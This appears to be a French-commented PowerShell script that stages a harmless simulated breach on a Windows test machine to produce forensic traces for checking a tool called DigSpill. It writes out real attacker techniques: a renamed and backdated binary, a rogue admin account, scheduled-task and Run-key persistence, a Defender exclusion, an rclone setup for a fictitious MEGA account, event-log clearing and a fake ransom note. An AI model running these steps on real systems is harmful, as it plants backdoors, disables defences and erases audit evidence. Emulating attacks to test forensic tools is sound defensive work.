# Scenario d'attaque reel et sans danger, joue sur le Windows de test AVANT la collecte.
# Chaque action laisse de vraies traces Windows (journaux, Prefetch, registre, fichiers, navigateur).
# Rien ne sort du poste : la "fuite" est une copie locale par rclone, le compte MEGA est fictif et jamais contacte.
# La verite terrain (ce qui a ete fait, quand, et ce que DigSpill devrait retrouver) est ecrite dans le fichier passe en argument.
param([Parameter(Mandatory = $true)][string]$Verite)
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$v = New-Object System.Collections.Generic.List[object]
function Fait([string]$id, [string]$quoi, [string[]]$motifs) {
    $v.Add([pscustomobject]@{ Id = $id; Heure = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); Action = $quoi; Motifs = $motifs })
    Write-Host ("[scenario] {0}  {1}" -f (Get-Date -Format 'HH:mm:ss'), $quoi)
}
$pub = 'C:\Users\Public'

# 0. poste bien configure : audit des processus avec ligne de commande, Prefetch, journal des scripts PowerShell
& auditpol.exe /set /subcategory:'{0CCE922B-69AE-11D9-BED3-505054503030}' /success:enable | Out-Null
& reg.exe add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit' /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f | Out-Null
& reg.exe add 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters' /v EnablePrefetcher /t REG_DWORD /d 3 /f | Out-Null
try { Set-Service SysMain -StartupType Automatic; Start-Service SysMain } catch { Write-Host "SysMain : $($_.Exception.Message)" }
& reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f | Out-Null
Fait 'preparation' 'Audit des processus (4688 + ligne de commande), Prefetch et journal des scripts PowerShell actives' @()

# 1. donnees de patients factices
$pat = Join-Path $pub 'Documents\Patients'
New-Item -ItemType Directory -Force -Path $pat | Out-Null
$rnd = New-Object Random 42
for ($i = 1; $i -le 40; $i++) { $b = New-Object byte[] 200000; $rnd.NextBytes($b); [IO.File]::WriteAllBytes((Join-Path $pat ('fiche_patient_{0:000}.pdf' -f $i)), $b) }
Fait 'donnees' "40 fiches patients factices dans $pat" @('Patients')

# 2. outil depose et antidate, lance une fois
$outil = Join-Path $pub 'svhost.exe'
Copy-Item "$env:SystemRoot\System32\curl.exe" $outil -Force
& $outil --version | Out-Null
(Get-Item $outil).CreationTime = [datetime]'2019-02-03 10:00:00'
(Get-Item $outil).LastWriteTime = [datetime]'2019-02-03 10:00:00'
Fait 'outil' "Outil depose sous un faux nom ($outil, copie de curl.exe), lance, puis antidate au 03/02/2019" @('svhost.exe')

# 3. compte administrateur cree par l'attaquant
& net.exe user support_it 'Recette!2026-DigSpill' /add | Out-Null
try { Add-LocalGroupMember -SID 'S-1-5-32-544' -Member 'support_it' } catch { Write-Host "groupe : $($_.Exception.Message)" }
Fait 'compte' 'Compte local support_it cree et ajoute aux Administrateurs' @('support_it')

# 4. persistance : tache planifiee et cle Run
& schtasks.exe /create /tn 'MicrosoftEdgeUpdateTaskMachineCoreX' /tr "$outil --version" /sc onlogon /ru SYSTEM /f | Out-Null
& reg.exe add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v OneDriveSync /t REG_SZ /d $outil /f | Out-Null
Fait 'persistance' 'Tache planifiee MicrosoftEdgeUpdateTaskMachineCoreX et cle Run OneDriveSync vers svhost.exe' @('MicrosoftEdgeUpdateTaskMachineCoreX', 'OneDriveSync')

# 5. exclusion antivirus
try { Add-MpPreference -ExclusionPath $pub } catch { Write-Host "Defender : $($_.Exception.Message)" }
Fait 'defender' "Exclusion Defender ajoutee sur $pub" @('C:\\Users\\Public')

# 6. rclone avec un compte MEGA fictif, copie locale des fiches (aucun envoi)
try {
    $zip = Join-Path $env:TEMP 'rclone.zip'
    Invoke-WebRequest -UseBasicParsing 'https://downloads.rclone.org/rclone-current-windows-amd64.zip' -OutFile $zip
    $x = Join-Path $env:TEMP 'rclone_x'; Expand-Archive $zip $x -Force
    Copy-Item (Get-ChildItem $x -Recurse -Filter rclone.exe | Select-Object -First 1).FullName (Join-Path $pub 'rclone.exe') -Force
    $rc = Join-Path $pub 'rclone.exe'
    $conf = Join-Path $env:APPDATA 'rclone'; New-Item -ItemType Directory -Force -Path $conf | Out-Null
    $obs = (& $rc obscure 'mot-de-passe-fictif').Trim()
    @("[mega]", "type = mega", "user = exfil.recette@example.com", "pass = $obs", "") | Set-Content (Join-Path $conf 'rclone.conf') -Encoding ASCII
    & $rc copy $pat 'C:\ProgramData\cache_sync' --transfers 4 2>&1 | Out-Null
    Fait 'rclone' 'rclone.exe depose dans C:\Users\Public, configure avec un compte MEGA fictif (exfil.recette@example.com), copie des fiches vers C:\ProgramData\cache_sync' @('rclone', 'cache_sync', 'exfil.recette@example.com')
} catch { Write-Host "rclone : $($_.Exception.Message)" }

# 7. archive de sortie
Compress-Archive -Path "$pat\*" -DestinationPath 'C:\ProgramData\cache_sync\backup_2026.zip' -Force
Fait 'archive' 'Archive C:\ProgramData\cache_sync\backup_2026.zip des fiches' @('backup_2026.zip')

# 8. navigation vers des sites de partage (vrai navigateur, vrai profil)
foreach ($nav in @("${env:ProgramFiles}\Google\Chrome\Application\chrome.exe", "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe")) {
    if (-not (Test-Path $nav)) { continue }
    foreach ($u in 'https://mega.nz/', 'https://wetransfer.com/') {
        $p = Start-Process $nav -ArgumentList '--headless=new', '--disable-gpu', '--no-first-run', '--virtual-time-budget=5000', '--dump-dom', $u -PassThru -WindowStyle Hidden -RedirectStandardOutput (Join-Path $env:TEMP 'nav.txt')
        if (-not $p.WaitForExit(40000)) { try { $p.Kill() } catch { } }
    }
}
Fait 'navigation' 'Visite de mega.nz et wetransfer.com avec Chrome et Edge (profil de l''utilisateur)' @('mega.nz', 'wetransfer')

# 9. echecs de connexion (mot de passe errone)
for ($i = 1; $i -le 6; $i++) { & net.exe use '\\127.0.0.1\IPC$' /user:administrateur 'MauvaisMotDePasse' 2>&1 | Out-Null }
Fait 'echecs' '6 echecs d''authentification (4625) pour le compte administrateur' @('4625')

# 10. commandes de reconnaissance et PowerShell encode
& whoami.exe /all | Out-Null
& net.exe group 'domain admins' /domain 2>&1 | Out-Null
& vssadmin.exe list shadows 2>&1 | Out-Null
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-ChildItem '$pat' | Measure-Object -Property Length -Sum"))
& powershell.exe -NoProfile -EncodedCommand $enc | Out-Null
Fait 'reconnaissance' 'whoami /all, net group, vssadmin list shadows, PowerShell -EncodedCommand' @('whoami', 'EncodedCommand')

# 11. effacement d'un journal
& wevtutil.exe cl 'Microsoft-Windows-WinRM/Operational'
Fait 'journal' 'Journal Microsoft-Windows-WinRM/Operational efface (wevtutil cl)' @('wevtutil')

# 12. chiffrement d'une partie des documents et note de rancon
$cpt = Join-Path $pub 'Documents\Compta'
New-Item -ItemType Directory -Force -Path $cpt | Out-Null
for ($i = 1; $i -le 30; $i++) { $b = New-Object byte[] 50000; $rnd.NextBytes($b); [IO.File]::WriteAllBytes((Join-Path $cpt ('facture_{0:000}.xlsx.lockbit3' -f $i)), $b) }
"Vos fichiers sont chiffres. Recette DigSpill : ceci est un test, aucun fichier n'a ete chiffre." | Set-Content (Join-Path $cpt 'LIRE_POUR_RESTAURER.txt') -Encoding ASCII
Fait 'rancon' "30 fichiers .lockbit3 et une note LIRE_POUR_RESTAURER.txt dans $cpt" @('lockbit3', 'LIRE_POUR_RESTAURER')

# 13. svhost.exe encore actif au moment de la collecte, avec une connexion ouverte vers Internet
Start-Process $outil -ArgumentList '-s', '-o', 'NUL', '--limit-rate', '2k', 'https://downloads.rclone.org/rclone-current-windows-amd64.zip' -WindowStyle Hidden
Fait 'actif' 'svhost.exe laisse actif, connecte a downloads.rclone.org (telechargement lent)' @('svhost.exe')

$v | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $Verite -Encoding UTF8
Write-Host "verite terrain : $Verite ($($v.Count) actions)"
